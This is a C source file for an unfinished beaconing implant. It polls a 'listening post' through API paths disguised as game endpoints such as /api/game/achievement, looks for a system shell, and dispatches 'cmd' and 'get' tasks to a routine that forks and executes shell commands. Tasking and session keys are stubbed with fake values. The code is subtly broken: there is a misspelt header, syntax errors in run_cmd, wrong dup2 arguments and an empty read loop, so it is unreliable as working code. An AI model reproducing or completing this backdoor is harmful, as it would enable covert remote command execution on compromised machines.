// builtin
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <strings.h>
#include <signal.h>
#include <fnctl.h>

// 3rd party
#include "logc/src/log.h"

// local
#include "tasks.h"


// Globals
char * cuid = NULL;
char * key = NULL;
char * api_register = "/api/game/login";
char * api_taskboard = "/api/game";
char * api_drop = "/api/game/achievement";
char * api_root = "http://localhost:6543";
long beacon_time = 5;
long cmd_timeout = 10;
char * command_hint = NULL;
char * command_arg_zero = NULL;


/*
	Attempt to find a shell binary
*/
int get_command_shell() {
	struct stat buf;
	if(!stat("/bin/sh", &buf)) {
		command_hint = "/bin/sh";
		command_arg_zero = "-c";
	}
	else if(!stat("/system/bin/sh", &buf)) {
		command_hint = "/system/bin/sh";
		command_arg_zero = "-c";
	}
	// TODO: does this work on Windows?
	else if(!stat("cmd.exe", &buf)) {
		command_hint = "cmd.exe";
		command_arg_zero = "/C";
	}
	else {
		log_warn("No shell executable found");
		return -1;
	}
	log_info("Shell: %s %s", command_hint, command_arg_zero);
	return 0;
}

/*
	Retrieve session keys from LP
*/
int get_keys() {
	cuid = "dummy_cuid";
	key = "dummy_key";
	return 0;
}

/*
	Return a task enum from the name string
*/
task_type task_from_name(char * name) {
	if(!name) {
		return NOTASK;
	}
	size_t num_task_names = sizeof(task_names) / sizeof(task_names[0]);
	for(size_t i=1; i<num_task_names; i++) {
		if(!strcasecmp(task_names[i], name)) {
			return (task_type)i;
		}
	}
	return NOTASK;
}

/*
	Generate fake tasks for testing
*/
int get_task_fake(char ** taskret) {
	static int fake_task_index = 0;
	*taskret = NULL;
	int ret = 1;
	switch(fake_task_index) {
		case 0:
			*taskret = "cmd";
			break;
		case 1:
			*taskret = "get";
			break;
		case 2:
			*taskret = "GET";
			break;
		case 3:
			*taskret = "blah";
			break;
		case 4:
			*taskret = NULL;
			break;
		default:
			*taskret = NULL;
			ret = 0;
			break;
	}
	fake_task_index ++;
	return ret;
}

/*
	Query the LP for tasks
*/
int get_task(char ** taskret) {
	return get_task_fake(taskret);
}

typedef struct {
	int success;
	int ret;
	char * stdout;
	size_t stdout_len;
	size_t stdout_buf_len;
	char * stderr;
	size_t stderr_len;
	size_t stderr_buf_len;
} cmd_ret_t;

/*
	Read data into a buffer

	Resizes the buffer as necessary
	fd:
		the fd to read from
	buf:
		pointer to the char* buffer to read into
	buf_len:
		pointer to the length of data in buf
	buf_buf_len:
		pointer to the actual length of buf
*/
ssize_t readsome(int fd, char ** buf, size_t * buf_len, size_t * buf_buf_len) {
	size_t remaining = *buf_buf_len - *buf_len;
	if(remaining == 0) {
		void * newloc = realloc((void *)(*buf), buf_buf_len * 2);
		if(!newloc) {
			log_error("Couldn't resize buffer");
			return (ssize_t) -1;
		}
		*buf = newloc;
		*buf_buf_len *= 2;
		remaining = *buf_buf_len - *buf_len;
	}
	ssize_t numread = read(fd, (void *)(*buf + *buf_len), remaining);
	if(numread == -1) {
		return (ssize_t) -1;
	}
	*buf_len += numread;
	return numread;
}

/*
	Run a shell command and return stdout/stderr/retcode
*/
cmd_ret_t run_cmd(char * command) {
	cmd_ret = cmd_ret_t = {
		0,
		0,
		(char*)malloc(32);
		0,
		32,
		(char*)malloc(32);
		0,
		32
	};

	int stdout_pipe[2];
	int stderr_pipe[2];
	if(pipe(stdout_pipe) || pipe(stderr_pipe)) {
		log_error("Couldn't open pipes");
		return cmd_ret;
	}

	pid_t cpid = fork();
	if(cpid == -1) {
		log_error("Failed to fork");
		return cmd_ret;
	}
	if(cpid == 0) {
		// child

		// close read ends
		close(stdout_pipe[0]);
		close(stderr_pipe[0]);

		alarm(cmd_timeout);

		dup2(stdout, stdout_pipe[1]);
		dup2(stderr, stderr_pipe[1]);

		execlp(command_hint, command_arg_zero, command, (char *)0);

		// close write ends
		close(stdout_pipe[1]);
		close(stderr_pipe[1]);
	}
	else {
		// parent
	
		// close write ends
		close(stdout_pipe[1]);
		close(stderr_pipe[1]);

		int stdout_open = 1;
		int stderr_open = 1;
		while(stdout_open || stderr_open) {

		}
	}


} 

/*
	Continually query the LP for tasks
*/
void task_loop() {
	char * task = NULL;
	long fail_count = 0;
	while(fail_count < 3) {
		int ok = get_task(&task);
		if(ok) {
			task_type tt = task_from_name(task);
			switch(tt) {
				case CMD:
					log_debug("Running CMD");
					break;
				case GET:
					log_debug("Running GET");
					break;
				default:
					log_warn("Unknown task: %s", task);
			}
		}
		else {
			fail_count ++;
			log_trace("Couldn't get task");
		}
		
	sleep((unsigned int)beacon_time);
	}
	log_warn("Exceded fail count");
}


int main(int argc, char * const *argv)
{
	int opt;
	int log_level = LOG_WARN;
	// url, beacon interval, command timeout
	while((opt = getopt(argc, argv, "u:b:c:qv")) != -1) {
		switch(opt) {
			case 'u':
				api_root = optarg;
				break;
			case 'b':
				beacon_time = atoi(optarg);
				break;
			case 'c':
				cmd_timeout = atoi(optarg);
				break;
			case 'q':
				log_set_quiet(1);
				break;
			case 'v':
				log_level --;
				if(log_level < LOG_TRACE) {
					log_level = LOG_TRACE;
				}
				break;
			default:
				fprintf(stderr, "Usage: %s [-u url] [-b beacon_time] [-c cmd_timeout]\n", argv[0]);
				return -1;
				break;
		}
	}
	log_set_level(log_level);

	// // test logs
	// log_trace("trace");
	// log_debug("debug");
	// log_info("info");
	// log_warn("warn");
	// log_error("error");
	// log_fatal("fatal");

	log_info("Url: %s, beacon: %d, timeout: %d", api_root, beacon_time, cmd_timeout);

	get_command_shell();

	if(get_keys()) {
		log_fatal("Failed to get keys");
		return -2;
	}

	log_info("cuid: %s, key: %s", cuid, key);

	task_loop();

	return 0;
}